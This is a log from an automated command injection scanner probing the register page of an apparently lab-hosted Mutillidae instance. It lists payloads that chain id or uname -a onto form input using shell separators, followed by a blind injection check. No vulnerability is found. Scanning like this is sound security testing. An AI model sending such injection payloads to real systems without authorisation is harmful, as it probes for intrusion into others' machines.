INFO - 
Starting ScanCommandInject scan
INFO - 	No forms found on http://192.168.232.129:80/. Skipping...
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=register.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=register.php
